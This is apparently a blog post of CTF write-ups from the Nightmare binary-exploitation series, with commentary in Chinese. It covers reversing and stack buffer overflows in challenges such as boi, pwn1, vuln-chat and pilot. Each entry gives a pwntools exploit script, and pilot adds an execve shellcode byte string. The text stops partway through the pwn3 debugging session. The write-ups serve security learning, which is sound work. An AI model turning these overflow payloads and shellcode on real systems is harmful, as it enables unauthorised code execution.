---
title: "Write-ups: Nightmare series"
published: 2024-07-24
updated: 2024-08-05
description: "Write-ups for Nightmare binary exploitation series."
tags: ["Pwn", "Write-ups"]
category: "Write-ups"
draft: false
---

# CSAW 2019 beleaf

## Information

- Category: Reverse
- Points: 50

## Description

> tree sounds are best listened to by <https://binary.ninja/demo> or ghidra

## Write-up

简单运行一下程序：

```plaintext
λ ~/ ./beleaf
Enter the flag
>>> i dont have the fucking flag
Incorrect!
```

一些基本信息：

```plaintext
λ ~/ file beleaf
beleaf: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=6d305eed7c9bebbaa60b67403a6c6f2b36de3ca4, stripped
```

大概可以推测出我们的目标就是弄到一个正确的 `flag`。

丢到 IDA 里发现，输入长度小于等于 32 (0x20) 会输出 `Incorrect!`，所以 `flag` 长度起码 33 字节。

<center>
  <img src="https://s21.ax1x.com/2024/07/24/pkb9i4O.png" />
</center>

接下来进入一个简单的 for 循环，将我们输入的每一个字符逐一放到 `calc_idx` 函数中，并将返回值与 `valid_arr[i]` 比较，如果不等于 `valid_arr[i]` 则输出 `Incorrect!`。如果所有字符都通过了验证，则输出 `Correct!`

再看看 `calc_idx` 函数，大致可以看出它的作用是根据传入的字符查找它在 `charset` 中对应的索引。

<center>
  <img src="https://s21.ax1x.com/2024/07/24/pkb9kCD.png" />
</center>

`calc_idx` 的核心如下：

- `character == charset[i]` 则返回索引 `i`
- `character >= charset[i]` 则设置索引为 `i = 2 * (i + 1)`
- 否则设置索引为 `i = 2 * i + 1`

因此我们构造 `flag` 的关键条件就是：

- `flag` 长度 >= 33
- `calc_idx(input[i]) == valid_arr[i]`

## Exploit

```python
#!/usr/bin/python3

import sys

valid_arr = [
    0x01, 0x09, 0x11, 0x27, 0x02,
    0x00, 0x12, 0x03, 0x08, 0x12,
    0x09, 0x12, 0x11, 0x01, 0x03,
    0x13, 0x04, 0x03, 0x05, 0x15,
    0x2E, 0x0A, 0x03, 0x0A, 0x12,
    0x03, 0x01, 0x2E, 0x16, 0x2E,
    0x0A, 0x12, 0x06
]

charset = [
    0x00000077, 0x00000066, 0x0000007B, 0x0000005F, 0x0000006E,
    0x00000079, 0x0000007D, 0xFFFFFFFF, 0x00000062, 0x0000006C,
    0x00000072, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF,
    0xFFFFFFFF, 0xFFFFFFFF, 0x00000061, 0x00000065, 0x00000069,
    0xFFFFFFFF, 0x0000006F, 0x00000074, 0xFFFFFFFF, 0xFFFFFFFF,
    0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF,
    0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF,
    0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000067,
    0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF,
    0xFFFFFFFF, 0x00000075
]

def create_charset():
    result = ''

    for c in charset:
        try:
            result += chr(c)
        except OverflowError:
            continue

    return result

def checker(char):
    i = 0
    while char != charset[i]:
        if char >= charset[i]:
            i = 2 * (i + 1)
        else:
            i = 2 * i + 1
    return i

def main():
    charset = create_charset()

    i = 0
    while (i < 33):
        for c in charset:
            if checker(ord(c)) == valid_arr[i]:
                sys.stdout.write(c)
        i += 1

if __name__ == '__main__':
    main()
```

## Flag

Flag: `flag{we_beleaf_in_your_re_future}`

# CSAW 2018 Quals Boi

## Information

- Category: Pwn
- Points: 25

## Description

> Only big boi pwners will get this one!

## Write-up

```plaintext
λ ~/ file boi
boi: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=1537584f3b2381e1b575a67cba5fbb87878f9711, not stripped
λ ~/ pwn checksec boi
[*] '/home/cub3y0nd/boi'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

试运行一下，发现它只是输出系统时间：

```plaintext
λ ~/ ./boi
Are you a big boiiiii??
aaaa
Thu Jul 25 05:35:00 PM CST 2024
```

<center>
  <img src="https://s21.ax1x.com/2024/07/25/pkbJ5H1.png" />
</center>

从 IDA 里面可以看出，程序可以将一个 24 (0x18) 字节 数据读入 `buf` 中。如果 `v5` 的 HIDWORD（高位四字节）等于 `0xCAF3BAEE` 则返回 shell，否则返回系统时间。

所以我们的思路就是溢出，然后覆盖原始数据。

下面是两种得到溢出点的方法：

1. 由于 `buf` 只有 16 字节大小（2 \* \_\_int64），而 `read` 却可以读取 24 字节数据，所以这里存在栈溢出漏洞，可以覆盖变量 `v5` 的内容。所以 payload 可以是 16（填满 buf） + 4（填满 4 字节低位使后面的数据可以直接覆盖高位数据，也就是做判断的部分） 字节垃圾数据 + `0xCAF3BAEE`。
2. 通过调试知道溢出点是 20 (0x14)：

<center>
  <img src="https://s21.ax1x.com/2024/07/25/pkbYnU0.png" />
</center>

## Exploit

```python
#!/usr/bin/python3

from pwn import *

context(os='linux', arch='amd64', log_level='debug', terminal='kitty')

target = process('./boi')

payload = b'A' * 0x14 + p32(0xcaf3baee)

target.send(payload)
target.interactive()
```

## Flag

Flag: `flag{Y0u_Arrre_th3_Bi66Est_of_boiiiiis}`

# TAMU 2019 pwn1

## Information

- Category: Pwn
- Points: Unknow

## Description

> Unknow

## Write-up

```plaintext
λ ~/ file boi
pwn1: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=d126d8e3812dd
7aa1accb16feac888c99841f504, not stripped
λ ~/ pwn checksec pwn1
[*] '/home/cub3y0nd/pwn1'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

```plaintext
λ ~/ ./pwn1
Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.
What... is your name?
aaaa
I don't know that! Auuuuuuuugh!
```

咋一看好像没啥东西，丢到 IDA 里面瞧瞧：

<center>
  <img src="https://s21.ax1x.com/2024/07/26/pkb4IlF.png" />
</center>

显然，根据伪代码可以轻易的知道如何绕过前两问的输入。然后第三问采用了一个 `gets()` 函数接收输入，输入保存到一个 43 字节大小的字符数组里面。由于 `gets()` 不检查输入大小，因此超过 `input` 容量的内容会溢出到 `v5`。最后如果 `v5 == 0xDEA110C8` 则输出 `flag`。

所以思路就是先回答前两问，然后填满 `input`，将 `0xDEA110C8` 溢出到变量 `v5`，结束。

## Exploit

```python
#!/usr/bin/python3

from pwn import *

context(os='linux', arch='amd64', log_level='debug', terminal='kitty')

target = process('./pwn1')

recvuntil = lambda str : print(target.recvuntil(str))

payload = b'A' * 0x2b + p32(0xdea110c8)

recvuntil(b'What... is your name?')
target.sendline(b'Sir Lancelot of Camelot')
recvuntil(b'What... is your quest?')
target.sendline(b'To seek the Holy Grail.')
recvuntil(b'What... is my secret?')
target.sendline(payload)
target.interactive()
```

## Flag

Flag: `flag{g0ttem_b0yz}`

# Tokyo Westerns CTF 3rd 2017 JustDoIt

## Information

- Category: Pwn
- Points: Unknow

## Description

> Unknow

## Write-up

```plaintext
λ ~/ file just_do_it
just_do_it: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=cf72d1d758e59a5b9912e0e83c3af92175c6f629, not stripped
λ ~/ pwn checksec just_do_it
[*] '/home/cub3y0nd/just_do_it'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

```plaintext
λ ~/ ./just_do_it
Welcome my secret service. Do you know the password?
Input the password.
aaaa
Invalid Password, Try Again!
```

可能是要获得密码打印 `flag`，丢到 IDA 看看：

<center>
  <img src="https://s21.ax1x.com/2024/07/27/pkqmom8.png" />
</center>

看伪代码发现，就算提供了正确的密码也只是输出一条消息而已，得到密码好像并没有什么用。这就是一个障眼法！

<center>
  <img src="https://s21.ax1x.com/2024/07/27/pkqmLfs.png" />
</center>

虽然不需要密码，但是如果你好奇密码的话，也不是不行... 通过 IDA 我们知道密码是 `P@SSW0RD`，于是乎：

<center>
  <img src="https://s21.ax1x.com/2024/07/27/pkqn97F.png" />
</center>

这里即使有了正确的密码还是提示密码错误的原因是 `fgets` 函数会把换行符也读进去。所以我们只需要在密码后面加上空字符 `\0` 就可以去掉换行符了。

<center>
  <img src="https://s21.ax1x.com/2024/07/27/pkqnp0U.png" />
</center>

扯远了...

通过之前的伪代码可以发现，`fgets` 接收的输入大小远超 `input` 可容纳的大小。因此通过调试可以知道溢出 padding 是 20 字节：

<center>
  <img src="https://s21.ax1x.com/2024/07/27/pkqnApR.png" />
</center>

那么有了溢出 padding 后怎么获取 flag 呢？

由伪代码知，它会从 `stream` 里面读取 48 字节的数据，保存到 `flag` 变量里面。那么我们如果可以直接输出 `flag` 就好了。这里有一个思路是利用之前的溢出漏洞，将 `input` 填满后把 `flag` 变量的地址溢出给 `v6`，这就会导致 `puts` 输出 `flag` 变量的内容。perfect 移花接木

嗯...这样就很清晰了。通过 IDA 直接看 `flag` 在 `.bss` 中的地址：

<center>
  <img src="https://s21.ax1x.com/2024/07/27/pkqnQtH.png" />
</center>

当然，如果你想验证它是不是真我们所想覆盖了 `v6` 让 `puts` 输出 `flag` 的内容：

<center>
  <img src="https://s21.ax1x.com/2024/07/27/pkqntnf.png" />
</center>

## Exploit

```python
#!/usr/bin/python3

from pwn import *

context(os='linux', arch='amd64', log_level='debug', terminal='kitty')

target = process('./just_do_it')

payload = b'A' * 0x14 + p32(0x0804A080)

target.sendline(payload)
target.interactive()
```

## Flag

Flag: `TWCTF{pwnable_warmup_I_did_it!}`

# CSAW 2016 Quals Warmup

## Information

- Category: Pwn
- Points: 50

## Description

> So you want to be a pwn-er huh? Well let's throw you an easy one ;)

## Write-up

```plaintext
λ ~/ file warmup
warmup: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=ab209f3b8a3c2902e1a2ecd5bb06e258b45605a4, not stripped
λ ~/ pwn checksec warmup
[*] '/home/cub3y0nd/warmup'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

```plaintext
λ ~/ ./warmup
-Warm Up-
WOW:0x40060d
>wow
```

<center>
  <img src="https://s21.ax1x.com/2024/07/28/pkqh8T1.png" />
</center>

这种题真就是闭着眼睛做... 一眼出思路：溢出 `v5` 覆盖返回地址为 `easy` 函数即可。

值得注意的是首先要了解函数调用约定和栈帧布局，这样才能准确的覆盖返回地址。可以参考下面两篇文章：

- [C 语言函数调用栈（一）](http://www.cnblogs.com/clover-toeic/p/3755401.html)
- [C 语言函数调用栈（二）](http://www.cnblogs.com/clover-toeic/p/3756668.html)

还有一点就是确保 [栈对齐](https://www.cubeyond.net/blog/pwn-notes/stack/return-oriented-programming/stack-alignment)。

## Exploit

```python
#!/usr/bin/python3

from pwn import *

context(os='linux', arch='amd64', log_level='debug', terminal='kitty')

target = process('./warmup')

# payload = b'A' * (64 + 8) + p64(0x40060d + 0x1)
payload = b'A' * (64 + 8) + p64(0x4006a4) + p64(0x40060d)

target.sendline(payload)
target.interactive()
```

## Flag

Flag: `FLAG{LET_US_BEGIN_CSAW_2016}`

# CSAW Quals 2018 Get It

## Information

- Category: Pwn
- Points: 100

## Description

> Do you get it?

## Write-up

```plaintext
λ ~/ file get_it
get_it: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=87529a0af36e617a1cc6b9f53001fdb88a9262a2, not stripped
λ ~/ pwn checksec get_it
[*] '/get_it'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

```plaintext
λ ~/ ./get_it
Do you gets it??
i will
```

伪代码如下：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[32]; // [rsp+10h] [rbp-20h] BYREF

  puts("Do you gets it??");
  gets(v4);
  return 0;
}
```

```c
int give_shell()
{
  return system("/bin/bash");
}
```

## Exploit

```python
#!/usr/bin/python3

from pwn import *

context(os='linux', arch='amd64', log_level='debug', terminal='kitty')

target = process('./get_it')

payload = b'A' * (0x20 + 0x8) + p64(0x4005f7) + p64(0x4005b6)

target.sendline(payload)
target.interactive()
```

## Flag

Flag: `flag{y0u_deF_get_itls}`

# TUCTF 2017 vulnchat

## Information

- Category: Pwn
- Points: 50

## Description

> One of our informants goes by the handle djinn. He found some information while working undercover inside an organized crime ring. Although we've had trouble retrieving this information from him. He left us this chat client to talk with him. Let's see if he trusts you...

## Write-up

```plaintext
λ ~/ file vuln-chat
vuln-chat: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=a3caa1805eeeee1454ee76287be398b12b5fa2b7, not stripped
λ ~/ pwn checksec vuln-chat
[*] '/home/cub3y0nd/vuln-chat'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

```plaintext
λ ~/ ./vuln-chat
----------- Welcome to vuln-chat -------------
Enter your username: cub3y0nd
Welcome cub3y0nd!
Connecting to 'djinn'
--- 'djinn' has joined your chat ---
djinn: I have the information. But how do I know I can trust you?
cub3y0nd: tbh im ur daddy u can trust me LOL
djinn: Sorry. That's not good enough
```

伪代码：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[20]; // [esp+3h] [ebp-2Dh] BYREF
  char v5[20]; // [esp+17h] [ebp-19h] BYREF
  char var5[9]; // [esp+2Bh] [ebp-5h] BYREF

  setvbuf(stdout, 0, 2, 0x14u);
  puts("----------- Welcome to vuln-chat -------------");
  printf("Enter your username: ");
  strcpy(var5, "%30s");
  __isoc99_scanf(var5, v5);
  printf("Welcome %s!\n", v5);
  puts("Connecting to 'djinn'");
  sleep(1u);
  puts("--- 'djinn' has joined your chat ---");
  puts("djinn: I have the information. But how do I know I can trust you?");
  printf("%s: ", v5);
  __isoc99_scanf(var5, v4);
  puts("djinn: Sorry. That's not good enough");
  fflush(stdout);
  return 0;
}
```

```c
int printFlag()
{
  system("/bin/cat ./flag.txt");
  return puts("Use it wisely");
}
```

这题的重点在于 `scanf` 限制了最大输入长度，导致不能直接覆盖返回地址。因此需要先将最大输入长度扩大，下面是调试过程：

```
pwndbg> b *main+71
Breakpoint 1 at 0x80485d1
pwndbg> b *main+170
Breakpoint 2 at 0x8048634
pwndbg> cyclic 20
aaaabaaacaaadaaaeaaa
pwndbg> r
Starting program: /home/cub3y0nd/Projects/CTF/vuln-chat
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/libthread_db.so.1".
----------- Welcome to vuln-chat -------------
Enter your username:
Breakpoint 1, 0x080485d1 in main ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────
*EAX  0xffffd5d3 ◂— '%30s'
*EBX  0xf7f92e2c ◂— 0x22ed4c
 ECX  0x0
 EDX  0x0
*EDI  0xf7ffcb60 (_rtld_global_ro) ◂— 0x0
*ESI  0x8048660 (__libc_csu_init) ◂— push ebp
*EBP  0xffffd5d8 ◂— 0x0
*ESP  0xffffd5a0 —▸ 0xffffd5d3 ◂— '%30s'
*EIP  0x80485d1 (main+71) —▸ 0xfffe8ae8 ◂— 0x0
────────────────────────[ DISASM / i386 / set emulate on ]────────────────────────
 ► 0x80485d1 <main+71>     call   8048460h                      <__isoc99_scanf@plt>
        format: 0xffffd5d3 ◂— '%30s'
        vararg: 0xffffd5bf ◂— 0x0

   0x80485d6 <main+76>     add    esp, 8
   0x80485d9 <main+79>     lea    eax, [ebp - 19h]
   0x80485dc <main+82>     push   eax
   0x80485dd <main+83>     push   8048759h
   0x80485e2 <main+88>     call   80483e0h                      <printf@plt>

   0x80485e7 <main+93>     add    esp, 8
   0x80485ea <main+96>     push   8048766h
   0x80485ef <main+101>    call   8048410h                      <puts@plt>

   0x80485f4 <main+106>    add    esp, 4
   0x80485f7 <main+109>    push   1
────────────────────────────────────[ STACK ]─────────────────────────────────────
00:0000│ esp 0xffffd5a0 —▸ 0xffffd5d3 ◂— '%30s'
01:0004│-034 0xffffd5a4 —▸ 0xffffd5bf ◂— 0x0
02:0008│-030 0xffffd5a8 ◂— 0xffffffff
03:000c│-02c 0xffffd5ac —▸ 0xf7d71424 ◂— 0x920 /* ' \t' */
04:0010│-028 0xffffd5b0 —▸ 0xf7fbf380 —▸ 0xf7d64000 ◂— 0x464c457f
05:0014│-024 0xffffd5b4 ◂— 0x0
... ↓        2 skipped
──────────────────────────────────[ BACKTRACE ]───────────────────────────────────
 ► 0 0x80485d1 main+71
   1 0xf7d84bd7
   2 0xf7d84c9d __libc_start_main+141
   3 0x8048491 _start+33
──────────────────────────────────────────────────────────────────────────────────
pwndbg> c
Continuing.
aaaabaaacaaadaaaeaaa%100s
Welcome aaaabaaacaaadaaaeaaa%100s!
Connecting to 'djinn'
--- 'djinn' has joined your chat ---
djinn: I have the information. But how do I know I can trust you?
aaaabaaacaaadaaaeaaa%100s:
Breakpoint 2, 0x08048634 in main ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────
 EAX  0xffffd5d3 ◂— '%100s'
 EBX  0xf7f92e2c ◂— 0x22ed4c
 ECX  0x0
 EDX  0x0
 EDI  0xf7ffcb60 (_rtld_global_ro) ◂— 0x0
 ESI  0x8048660 (__libc_csu_init) ◂— push ebp
 EBP  0xffffd5d8 ◂— 0x0
 ESP  0xffffd5a0 —▸ 0xffffd5d3 ◂— '%100s'
*EIP  0x8048634 (main+170) —▸ 0xfffe27e8 ◂— 0x0
────────────────────────[ DISASM / i386 / set emulate on ]────────────────────────
 ► 0x8048634 <main+170>    call   8048460h                      <__isoc99_scanf@plt>
        format: 0xffffd5d3 ◂— '%100s'
        vararg: 0xffffd5ab ◂— 0xd71424ff

   0x8048639 <main+175>    add    esp, 8
   0x804863c <main+178>    push   80487ech
   0x8048641 <main+183>    call   8048410h                      <puts@plt>

   0x8048646 <main+188>    add    esp, 4
   0x8048649 <main+191>    mov    eax, dword ptr [8049a60h]
   0x804864e <main+196>    push   eax
   0x804864f <main+197>    call   80483f0h                      <fflush@plt>

   0x8048654 <main+202>    add    esp, 4
   0x8048657 <main+205>    mov    eax, 0
   0x804865c <main+210>    leave
────────────────────────────────────[ STACK ]─────────────────────────────────────
00:0000│ esp 0xffffd5a0 —▸ 0xffffd5d3 ◂— '%100s'
01:0004│-034 0xffffd5a4 —▸ 0xffffd5ab ◂— 0xd71424ff
02:0008│-030 0xffffd5a8 ◂— 0xffffffff
03:000c│-02c 0xffffd5ac —▸ 0xf7d71424 ◂— 0x920 /* ' \t' */
04:0010│-028 0xffffd5b0 —▸ 0xf7fbf380 —▸ 0xf7d64000 ◂— 0x464c457f
05:0014│-024 0xffffd5b4 ◂— 0x0
06:0018│-020 0xffffd5b8 ◂— 0x0
07:001c│-01c 0xffffd5bc ◂— 0x61000000
──────────────────────────────────[ BACKTRACE ]───────────────────────────────────
 ► 0 0x8048634 main+170
   1 0xf7d84bd7
   2 0xf7d84c9d __libc_start_main+141
   3 0x8048491 _start+33
──────────────────────────────────────────────────────────────────────────────────
pwndbg> x/s $ebp-0x5
0xffffd5d3: "%100s"
```

有了更大的输入空间后就可以利用第二个 `scanf` 来覆盖返回地址了。

## Exploit

```python
#!/usr/bin/python3

from pwn import *

context(os='linux', arch='amd64', log_level='debug', terminal='kitty')

target = process('./vuln-chat')

recvuntil   = lambda str : print(target.recvuntil(str))
sendline    = lambda str : target.sendline(str)
interactive = lambda : target.interactive()

recvuntil(b': ')
sendline(b'A' * 0x14 + b'%100s')
recvuntil(b': ')
payload = b'A' * 0x31 + p32(0x804856b)
sendline(payload)
interactive()
```

## Flag

flag: `TUCTF{574ck_5m45h1n6_l1k3_4_pr0}`

# CSAW 2017 pilot

## Information

- Category: Pwn
- Points: 100

## Description

> Can I take your order?

## Write-up

```plaintext
λ ~/ file pilot
pilot: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=6ed26a43b94fd3ff1dd15964e4106df72c01dc6c, stripped
λ ~/ pwn checksec pilot
[*] '/home/cub3y0nd/pilot'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x400000)
    Stack:    Executable
    RWX:      Has RWX segments
```

```plaintext
λ ~/ ./pilot
[*]Welcome DropShip Pilot...
[*]I am your assitant A.I....
[*]I will be guiding you through the tutorial....
[*]As a first step, lets learn how to land at the designated location....
[*]Your mission is to lead the dropship to the right location and execute sequence of instructions to save Marines & Medics...
[*]Good Luck Pilot!....
[*]Location:0x7ffdaefb40d0
[*]Command:self-destruct
```

伪代码如下：

<center>
  <img src="https://s21.ax1x.com/2024/07/30/pkLhlbd.png" />
</center>

可以看到除了 `main` 函数之外就没有别的函数了，那就不是 `ret2win` 题型。

接收的输入大于 `buf` 的大小，存在栈溢出漏洞。由于栈可执行，我们可以尝试运行 shellcode 来 get shell。

在栈中安排 shellcode 的布局如下：因为程序给出了 `buf` 的地址，所以我们可以将 shellcode 插在 `buf` 的头部，然后填满 `buf` 的剩余空间，最后将 `buf` 的起始地址溢出到 `ret` 就实现了执行 shellcode 的逻辑。

这里有一个现成的 [shellcode](http://shell-storm.org/shellcode/index.html) 网站。

## Exploit

```python
#!/usr/bin/python3

from pwn import *

context(os='linux', arch='amd64', log_level='debug', terminal='kitty')

target = process('./pilot')

recvline    = lambda : target.recvline()
recvuntil   = lambda str : target.recvuntil(str)
sendline    = lambda str : target.sendline(str)
interactive = lambda : target.interactive()

recvuntil(b':')
leak_addr = p64(int(recvline(), 16))

shellcode = b'\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05'
payload = shellcode + b'A' * (0x28 - len(shellcode)) + leak_addr

sendline(payload)
interactive()
```

## Flag

Flag: `flag{1nput_c00rd1nat3s_Strap_y0urse1v3s_1n_b0ys}`

# TAMU 2019 pwn3

## Information

- Category: Pwn
- Points: 387

## Description

> This challenge tackles stack buffer overflow leading to a shellcode execution.

## Write-up

```plaintext
λ ~/ file pwn3
pwn3: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=6ea573b4a0896b428db719747b139e6458d440a0, not stripped
λ ~/ pwn checksec pwn3
[*] '/home/cub3y0nd/pwn3'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      PIE enabled
    Stack:    Executable
    RWX:      Has RWX segments
```

```plaintext
λ ~/ ./pwn3
Take this, you might need it on your journey 0xffda23ae!
aight!
```

伪代码：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setvbuf(stdout, (char *)&dword_0 + 2, 0, 0);
  echo(&argc);
  return 0;
}
```

```c
char *echo()
{
  char s[294]; // [esp+Eh] [ebp-12Ah] BYREF

  printf("Take this, you might need it on your journey %p!\n", s);
  return gets(s);
}
```

一开始我还疑惑 `ebp-0x12a` 是个什么东西，后来调试发现和程序给我们的地址是一样的。那就不难想到它是想让我们把 shellcode 塞到这个地址里面。

调试过程如下：

```plaintext
pwndbg> disass main
Dump of assembler code for function main:
   0x000005e3 <+0>: lea    ecx,[esp+0x4]
   0x000005e7 <+4>: and    esp,0xfffffff0
   0x000005ea <+7>: push   DWORD PTR [ecx-0x4]
   0x000005ed <+10>: push   ebp
   0x000005ee <+11>: mov    ebp,esp
   0x000005f0 <+13>: push   ebx
   0x000005f1 <+14>: push   ecx
   0x000005f2 <+15>: call   0x629 <__x86.get_pc_thunk.ax>
   0x000005f7 <+20>: add    eax,0x19d5
   0x000005fc <+25>: mov    edx,DWORD PTR [eax+0x28]
   0x00000602 <+31>: mov    edx,DWORD PTR [edx]
   0x00000604 <+33>: push   0x0
   0x00000606 <+35>: push   0x0
   0x00000608 <+37>: push   0x2
   0x0000060a <+39>: push   edx
   0x0000060b <+40>: mov    ebx,eax
   0x0000060d <+42>: call   0x440 <setvbuf@plt>
   0x00000612 <+47>: add    esp,0x10
   0x00000615 <+50>: call   0x59d <echo>
   0x0000061a <+55>: mov    eax,0x0
   0x0000061f <+60>: lea    esp,[ebp-0x8]
   0x00000622 <+63>: pop    ecx
   0x00000623 <+64>: pop    ebx
   0x00000624 <+65>: pop    ebp
   0x00000625 <+66>: lea    esp,[ecx-0x4]
   0x00000628 <+69>: ret
End of assembler dump.
pwndbg> disass echo
Dump of assembler code for function echo:
   0x0000059d <+0>: push   ebp
   0x0000059e <+1>: mov    ebp,esp
   0x000005a0 <+3>: push   ebx
   0x000005a1 <+4>: sub    esp,0x134
   0x000005a7 <+10>: call   0x4a0 <__x86.get_pc_thunk.bx>
   0x000005ac <+15>: add    ebx,0x1a20
   0x000005b2 <+21>: sub    esp,0x8
   0x000005b5 <+24>: lea    eax,[ebp-0x12a]
   0x000005bb <+30>: push   eax
   0x000005bc <+31>: lea    eax,[ebx-0x191c]
   0x000005c2 <+37>: push   eax
   0x000005c3 <+38>: call   0x410 <printf@plt>
   0x000005c8 <+43>: add    esp,0x10
   0x000005cb <+46>: sub    esp,0xc
   0x000005ce <+49>: lea    eax,[ebp-0x12a]
   0x000005d4 <+55>: push   eax
   0x000005d5 <+56>: call   0x420 <gets@plt>
   0x000005da <+61>: add    esp,0x10
   0x000005dd <+64>: nop
   0x000005de <+65>: mov    ebx,DWORD PTR [ebp-0x4]
   0x000005e1 <+68>: leave
   0x000005e2 <+69>: ret
End of assembler dump.
pwndbg> b *echo+38
Breakpoint 1 at 0x5c3
pwndbg> r
Starting program: /home/cub3y0nd/Projects/CTF/pwn3
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/libthread_db.so.1".

Breakpoint 1, 0x565555c3 in echo ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────────────────────────
*EAX  0x565556b0 ◂— push esp /* 'Take this, you might need it on your journey %p!\n' */
*EBX  0x56556fcc (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ed4
 ECX  0x0
*EDX  0xf7f948a0 ◂— 0x0
*EDI  0xf7ffcb60 (_rtld_global_ro) ◂— 0x0
*ESI  0x56555630 (__libc_csu_init) ◂— push ebp
*EBP  0xffffd5c8 —▸ 0xffffd5d8 ◂— 0x0
*ESP  0xffffd480 —▸ 0x565556b0 ◂— push esp /* 'Take this, you might need it on your journey %p!\n' */
*EIP  0x565555c3 (echo+38) —▸ 0xfffe48e8 ◂— 0x0
────────────────────────────────────────────────────────────────────[ DISASM / i386 / set emulate on ]────────────────────────────────────────────────────────────────────
 ► 0x565555c3 <echo+38>    call   56555410h                     <printf@plt>
        format: 0x565556b0 ◂— 'Take this, you might need it on your journey %p!\n'
        vararg: 0xffffd49e ◂— 0x80000

   0x565555c8 <echo+43>    add    esp, 10h
   0x565555cb <echo+46>    sub    esp, 0ch
   0x565555ce <echo+49>    lea    eax, [ebp - 12ah]
   0x565555d4 <echo+55>    push   eax
   0x565555d5 <echo+56>    call   56555420h                     <gets@plt>

   0x565555da <echo+61>    add    esp, 10h
   0x565555dd <echo+64>    nop
   0x565555de <echo+65>    mov    ebx, dword ptr [ebp - 4]
   0x565555e1 <echo+68>    leave
   0x565555e2 <echo+69>    ret
────────────────────────────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────────────────────────────
00:0000│ esp 0xffffd480 —▸ 0x565556b0 ◂— push esp /* 'Take this, you might need it on your journey %p!\n' */
01:0004│-144 0xffffd484 —▸ 0xffffd49e ◂— 0x80000
02:0008│-140 0xffffd488 ◂— 0xffffffff
03:000c│-13c 0xffffd48c —▸ 0x565555ac (echo+15) ◂— add ebx, 1a20h
04:0010│-138 0xffffd490 ◂— 0x100
05:0014│-134 0xffffd494 ◂— 0x0
06:0018│-130 0xffffd498 ◂— 0x40 /* '@' */
07:001c│-12c 0xffffd49c ◂— 0x8000
──────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────────────────────────────
 ► 0 0x565555c3 echo+38
   1 0x5655561a main+55
   2 0xf7d84bd7
   3 0xf7d84c9d __libc_start_main+141
   4 0x56555491 _start+49
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> x/s $ebp-0x12a
0xffffd49e: ""
pwndbg> x/s $ebx-0x191c
0x565556b0: "Take this, you might need it on your journey %p!\n"
pwndbg> cyclic 300
